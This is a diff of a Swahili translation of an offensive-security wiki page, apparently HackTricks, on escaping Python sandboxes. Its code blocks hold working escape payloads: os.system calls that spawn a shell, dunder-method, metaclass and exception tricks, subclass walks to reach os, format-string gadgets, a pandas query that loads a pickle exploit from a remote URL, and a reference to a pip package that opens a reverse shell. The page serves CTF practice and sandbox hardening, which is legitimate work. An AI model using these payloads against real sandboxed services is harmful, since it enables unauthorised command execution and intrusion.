@@ -17,19 +17,19 @@ Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="
 
 <figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
-#### Get a hacker's perspective on your web apps, network, and cloud
+**Pata mtazamo wa hacker kuhusu programu zako za wavuti, mtandao, na wingu**
 
-**Find and report critical, exploitable vulnerabilities with real business impact.** Use our 20+ custom tools to map the attack surface, find security issues that let you escalate privileges, and use automated exploits to collect essential evidence, turning your hard work into persuasive reports.
+**Pata na ripoti mapungufu makubwa, yanayoweza kutumiwa ambayo yana athari halisi za kibiashara.** Tumia zana zetu zaidi ya 20 za kawaida kupanga uso wa shambulio, pata masuala ya usalama yanayokuruhusu kupandisha mamlaka, na tumia matumizi ya moja kwa moja kukusanya ushahidi muhimu, ukigeuza kazi yako ngumu kuwa ripoti za kushawishi.
 
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
 
 
 
-Hizi ni baadhi ya mbinu za kupita kinga za sanduku la python na kutekeleza amri zisizo na mipaka.
+Hizi ni baadhi ya mbinu za kupita kinga za sandbox za python na kutekeleza amri zisizo na mipaka.
 
-## Command Execution Libraries
+## Maktaba za Utekelezaji wa Amri
 
-Jambo la kwanza unahitaji kujua ni kama unaweza kutekeleza moja kwa moja msimbo na maktaba ambayo tayari imeagizwa, au kama unaweza kuagiza mojawapo ya hizi maktaba:
+Jambo la kwanza unahitaji kujua ni kama unaweza kutekeleza moja kwa moja msimbo na maktaba fulani iliyosajiliwa tayari, au kama unaweza kuagiza yoyote ya hizi maktaba:
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -77,7 +77,7 @@ Python hujaribu **kuchota maktaba kutoka kwa saraka ya sasa kwanza** (amri ifuat
 ### Pakiti za default
 
 Unaweza kupata **orodha ya pakiti zilizowekwa awali** hapa: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-Kumbuka kwamba kutoka kwa pickle unaweza kufanya mazingira ya python **kuagiza maktaba za kawaida** zilizowekwa kwenye mfumo.\
+Kumbuka kwamba kutoka kwa pickle unaweza kufanya mazingira ya python **kuagiza maktaba yoyote** iliyowekwa kwenye mfumo.\
 Kwa mfano, pickle ifuatayo, itakapochukuliwa, itakuwa inagiza maktaba ya pip kuitumia:
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
@@ -107,13 +107,13 @@ You can download the package to create the reverse shell here. Please, note that
 {% file src="../../../.gitbook/assets/Reverse.tar (1).gz" %}
 
 {% hint style="info" %}
-Hii pakiti inaitwa `Reverse`. Hata hivyo, ilitengenezwa mahsusi ili wakati unapotoka kwenye reverse shell, sehemu nyingine ya usakinishaji itashindwa, hivyo **hutaacha pakiti ya ziada ya python iliyosakinishwa kwenye seva** unapondoka.
+This package is called `Reverse`. However, it was specially crafted so that when you exit the reverse shell the rest of the installation will fail, so you **won't leave any extra python package installed on the server** when you leave.
 {% endhint %}
 
 ## Eval-ing python code
 
 {% hint style="warning" %}
-Kumbuka kwamba exec inaruhusu nyuzi nyingi na ";", lakini eval haifanyi hivyo (angalia opereta wa walrus)
+Note that exec allows multiline strings and ";", but eval doesn't (check walrus operator)
 {% endhint %}
 
 If certain characters are forbidden you can use the **hex/octal/B64** representation to **bypass** the restriction:
@@ -151,7 +151,7 @@ df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")
 # Like:
 df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
 ```
-## Wanaoperesheni na hila fupi
+## Watoa na hila fupi
 ```python
 # walrus operator allows generating variable inside a list
 ## everything will be executed in order
@@ -162,7 +162,7 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 ```
 ## Bypassing protections through encodings (UTF-7)
 
-Katika [**hii ripoti**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 inatumika kupakia na kutekeleza msimbo wa python wa kiholela ndani ya sandbox inayonekana:
+Katika [**hii ripoti**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 inatumika kupakia na kutekeleza msimbo wa python wa kawaida ndani ya sandbox inayonekana:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -201,13 +201,13 @@ X = exec(X)
 @'__import__("os").system("sh")'.format
 class _:pass
 ```
-### RCE kuunda vitu na kupita kiasi
+### RCE kuunda vitu na kupita
 
-Ikiwa unaweza **kutangaza darasa** na **kuunda kitu** cha darasa hilo unaweza **kuandika/kupita kiasi mbinu tofauti** ambazo zinaweza **kuchochewa** **bila** **kuhitaji kuziita moja kwa moja**.
+Ikiwa unaweza **kutangaza darasa** na **kuunda kitu** cha darasa hilo unaweza **kuandika/kupita mbinu tofauti** ambazo zinaweza **kuchochewa** **bila** **kuhitaji kuziita moja kwa moja**.
 
 #### RCE na madarasa ya kawaida
 
-Unaweza kubadilisha baadhi ya **mbinu za darasa** (_kwa kupita kiasi mbinu za darasa zilizopo au kuunda darasa jipya_) ili kufanya ziweze **kutekeleza msimbo wa kiholela** wakati **zinapochochewa** bila kuziita moja kwa moja.
+Unaweza kubadilisha baadhi ya **mbinu za darasa** (_kwa kupita mbinu za darasa zilizopo au kuunda darasa jipya_) ili kufanya ziweze **kutekeleza msimbo wa kawaida** wakati **zinapochochewa** bila kuziita moja kwa moja.
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -257,7 +257,7 @@ __iand__ (k = 'import os; os.system("sh")')
 __ior__ (k |= 'import os; os.system("sh")')
 __ixor__ (k ^= 'import os; os.system("sh")')
 ```
-#### Crating objects with [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses)
+#### Kuunda vitu na [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses)
 
 Jambo muhimu ambalo metaclasses zinaturuhusu kufanya ni **kuunda mfano wa darasa, bila kuita mjenzi** moja kwa moja, kwa kuunda darasa jipya na darasa lengwa kama metaclass.
 ```python
@@ -276,7 +276,7 @@ Sub['import os; os.system("sh")']
 ```
 #### Kuunda vitu kwa kutumia makosa
 
-Wakati **kosa linapotokea** kitu cha **Kosa** kina **undwa** bila wewe kuhitaji kuita mjenzi moja kwa moja (njia kutoka [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
+Wakati **kosa linapotokea**, kitu cha **Kosa** kina **undwa** bila wewe kuhitaji kuita mjenzi moja kwa moja (njia kutoka [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -339,10 +339,10 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ```
 ### No Builtins
 
-Wakati huna `__builtins__` huwezi kuagiza chochote wala kusoma au kuandika faili kwani **kazi zote za kimataifa** (kama `open`, `import`, `print`...) **hazijapakiwa**.\
-Hata hivyo, **kwa kawaida python inaagiza moduli nyingi kwenye kumbukumbu**. Moduli hizi zinaweza kuonekana kuwa salama, lakini baadhi yao **pia zinaagiza** kazi hatari ndani yao ambazo zinaweza kufikiwa ili kupata hata **utendaji wa msimbo wa kiholela**.
+Wakati huna `__builtins__` huwezi kuweza kuagiza chochote wala hata kusoma au kuandika faili kwani **kazi zote za kimataifa** (kama `open`, `import`, `print`...) **hazijapakiwa**.\
+Hata hivyo, **kwa kawaida python inaagiza moduli nyingi kwenye kumbukumbu**. Moduli hizi zinaweza kuonekana kuwa za kawaida, lakini baadhi yao **pia zinaagiza** kazi hatari ndani yao ambazo zinaweza kufikiwa ili kupata hata **utendaji wa msimbo wa kiholela**.
 
-Katika mifano ifuatayo unaweza kuona jinsi ya **kukandamiza** baadhi ya hizi moduli "**salama**" zilizopakiwa ili **kufikia** **kazi** **hatari** ndani yao.
+Katika mifano ifuatayo unaweza kuona jinsi ya **kudhulumu** baadhi ya hizi moduli "**za kawaida**" zilizopakiwa ili **kufikia** **kazi hatari** ndani yao.
 
 **Python2**
 ```python
@@ -426,7 +426,7 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-[**Hapa kuna kazi kubwa zaidi**](./#recursive-search-of-builtins-globals) ya kutafuta makumi/**mamia** ya **mahali** ambapo unaweza kupata **globals**.
+[**Hapa kuna kazi kubwa zaidi**](./#recursive-search-of-builtins-globals) ya kutafuta makumi/**miyamoja** ya **mahali** ambapo unaweza kupata **globals**.
 
 ## Gundua Utendaji wa Kijinga
 
@@ -508,7 +508,7 @@ Tunaweza kufanya jambo hilo hilo na **maktaba nyingine** ambazo tunajua zinaweza
 #pdb
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
 ```
-Zaidi ya hayo, tunaweza hata kutafuta ni moduli zipi zinazopakia maktaba za uhalifu:
+Zaidi ya hayo, tunaweza hata kutafuta ni moduli zipi zinazoleta maktaba za uhalifu:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 for b in bad_libraries_names:
@@ -527,7 +527,7 @@ builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalE
 pdb:
 """
 ```
-Zaidi ya hayo, ikiwa unafikiri **maktaba nyingine** zinaweza **kuitisha kazi za kutekeleza amri**, tunaweza pia **kuchuja kwa majina ya kazi** ndani ya maktaba zinazowezekana:
+Zaidi ya hayo, ikiwa unafikiri **maktaba nyingine** zinaweza **kuita kazi kutekeleza amri**, tunaweza pia **kuchuja kwa majina ya kazi** ndani ya maktaba zinazowezekana:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
@@ -563,7 +563,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## Recursive Search of Builtins, Globals...
 
 {% hint style="warning" %}
-Hii ni **ajabu**. Ikiwa unatafuta **kitu kama globals, builtins, open au chochote** tumia tu skripti hii ili **kutafuta kwa urudi wa mahali ambapo unaweza kupata kitu hicho.**
+Hii ni **ajabu**. Ikiwa unatafuta **kitu kama globals, builtins, open au chochote** tumia tu skripti hii ili **kutafuta kwa urahisi maeneo ambapo unaweza kupata kitu hicho.**
 {% endhint %}
 ```python
 import os, sys # Import these to find more gadgets
@@ -710,7 +710,7 @@ get_name_for_avatar(st, people_obj = people)
 ```
 Note how you can **access attributes** in a normal way with a **dot** like `people_obj.__init__` and **dict element** with **parenthesis** without quotes `__globals__[CONFIG]`
 
-Pia kumbuka kwamba unaweza kutumia `.__dict__` kuorodhesha vipengele vya kitu `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
+Pia kumbuka kwamba unaweza kutumia `.__dict__` kuhesabu vipengele vya kitu `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
 Baadhi ya sifa nyingine za kuvutia kutoka kwa format strings ni uwezekano wa **executing** the **functions** **`str`**, **`repr`** na **`ascii`** katika kitu kilichotajwa kwa kuongeza **`!s`**, **`!r`**, **`!a`** mtawalia:
 ```python
@@ -731,14 +731,14 @@ return 'HAL 9000'
 **Mifano zaidi** kuhusu **format** **string** mifano inaweza kupatikana katika [**https://pyformat.info/**](https://pyformat.info)
 
 {% hint style="danger" %}
-Angalia pia ukurasa ufuatao kwa vifaa ambavyo vitasoma taarifa nyeti kutoka kwa vitu vya ndani vya Python:
+Angalia pia ukurasa ufuatao kwa vifaa ambavyo vitasoma **habari nyeti kutoka kwa vitu vya ndani vya Python**:
 {% endhint %}
 
 {% content-ref url="../python-internal-read-gadgets.md" %}
 [python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
 {% endcontent-ref %}
 
-### Mifumo ya Ufunuo wa Taarifa Nyeti
+### Mifumo ya Ufunuo wa Habari Nyeti
 ```python
 {whoami.__class__.__dict__}
 {whoami.__globals__[os].__dict__}
@@ -762,7 +762,7 @@ Kama ukumbusho, kila wakati kitendo kinapofanywa katika python, kazi fulani inat
 
 Una zaidi kama hii katika sehemu [**Python utekelezaji bila simu**](./#python-execution-without-calls).
 
-Udhaifu wa muundo wa mfuatano wa python hauwezi kuruhusu kutekeleza kazi (hauwezi kuruhusu kutumia mabano), hivyo haiwezekani kupata RCE kama `'{0.system("/bin/sh")}'.format(os)`.\
+Udhaifu wa muundo wa mfuatano wa python hauwezi kuruhusu kutekeleza kazi (hauwezi kutumia mabano), hivyo haiwezekani kupata RCE kama `'{0.system("/bin/sh")}'.format(os)`.\
 Hata hivyo, inawezekana kutumia `[]`. Kwa hivyo, ikiwa maktaba ya kawaida ya python ina **`__getitem__`** au **`__getattr__`** ambayo inatekeleza msimbo usio wa kawaida, inawezekana kuutumia kupata RCE.
 
 Kutafuta kifaa kama hicho katika python, andiko linapendekeza hii [**Github search query**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code). Ambapo alipata hii [moja](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463):
@@ -787,7 +787,7 @@ return getattr(self, name)
 cdll = LibraryLoader(CDLL)
 pydll = LibraryLoader(PyDLL)
 ```
-Hii kifaa inaruhusu **kupakia maktaba kutoka diski**. Kwa hivyo, inahitajika kwa namna fulani **kuandika au kupakia maktaba ili kupakia** iliyokusanywa ipasavyo kwenye seva iliyoathiriwa.
+Hii kifaa inaruhusu **kupakia maktaba kutoka diski**. Hivyo, inahitajika kwa namna fulani **kuandika au kupakia maktaba ili kupakia** iliyokusanywa ipasavyo kwenye seva iliyoathiriwa.
 ```python
 '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
 ```
@@ -993,7 +993,7 @@ types.CodeType.__doc__
 ### Kuunda upya kazi iliyovuja
 
 {% hint style="warning" %}
-Katika mfano ufuatao, tutachukua data zote zinazohitajika kuunda upya kazi kutoka kwa kitu cha msimbo wa kazi moja kwa moja. Katika **mfano halisi**, **thamani** zote za kutekeleza kazi **`code_type`** ndizo **utahitaji kuvuja**.
+Katika mfano ufuatao, tutachukua data zote zinazohitajika kuunda kazi kutoka kwa kitu cha msimbo wa kazi moja kwa moja. Katika **mfano halisi**, **thamani** zote za kutekeleza kazi **`code_type`** ndizo **utakazohitaji kuvuja**.
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -1007,7 +1007,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Bypass Defenses
 
-Katika mifano ya awali mwanzoni mwa chapisho hili, unaweza kuona **jinsi ya kutekeleza msimbo wowote wa python kwa kutumia `compile` function**. Hii ni ya kuvutia kwa sababu unaweza **kutekeleza skripti nzima** zenye mizunguko na kila kitu katika **msemo mmoja** (na tunaweza kufanya vivyo hivyo kwa kutumia **`exec`**).\
+Katika mifano ya awali mwanzoni mwa chapisho hili, unaweza kuona **jinsi ya kutekeleza msimbo wowote wa python kwa kutumia `compile` function**. Hii ni ya kuvutia kwa sababu unaweza **kutekeleza skripti nzima** zenye mizunguko na kila kitu katika **line moja** (na tunaweza kufanya vivyo hivyo kwa kutumia **`exec`**).\
 Hata hivyo, wakati mwingine inaweza kuwa na manufaa **kuunda** **kipande kilichokusanywa** katika mashine ya ndani na kukitekeleza katika **CTF machine** (kwa mfano kwa sababu hatuna `compiled` function katika CTF).
 
 Kwa mfano, hebu tukusanye na kutekeleza kwa mikono kazi inayosoma _./poc.py_:
@@ -1037,7 +1037,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-Ikiwa huwezi kufikia `eval` au `exec` unaweza kuunda **kazi sahihi**, lakini kuitaja moja kwa moja kawaida kutashindwa na: _mwandamizi haupatikani katika hali iliyozuiliwa_. Hivyo unahitaji **kazi isiyo katika mazingira yaliyopunguzika kuitaja kazi hii.**
+Ikiwa huwezi kufikia `eval` au `exec` unaweza kuunda **kazi sahihi**, lakini kuitwa moja kwa moja kawaida kutashindwa na: _mwandamizi haupatikani katika hali iliyozuiliwa_. Hivyo unahitaji **kazi ambayo haipo katika mazingira yaliyopunguzika ili kuitwa kazi hii.**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1082,9 +1082,9 @@ will be bypassed
 
 <figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
-#### Pata mtazamo wa hacker kuhusu programu zako za wavuti, mtandao, na wingu
+**Pata mtazamo wa hacker kuhusu programu zako za wavuti, mtandao, na wingu**
 
-**Pata na ripoti udhaifu muhimu, unaoweza kutumiwa kwa faida halisi ya biashara.** Tumia zana zetu 20+ za kawaida kupanga uso wa shambulio, pata masuala ya usalama yanayokuruhusu kupandisha mamlaka, na tumia mashambulizi ya kiotomatiki kukusanya ushahidi muhimu, ukigeuza kazi yako ngumu kuwa ripoti za kushawishi.
+**Pata na ripoti mapungufu muhimu, yanayoweza kutumiwa kwa faida halisi ya biashara.** Tumia zana zetu 20+ za kawaida kupanga uso wa shambulio, pata masuala ya usalama yanayokuruhusu kupandisha mamlaka, na tumia mashambulizi ya kiotomatiki kukusanya ushahidi muhimu, ukigeuza kazi yako ngumu kuwa ripoti za kushawishi.
 
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
 
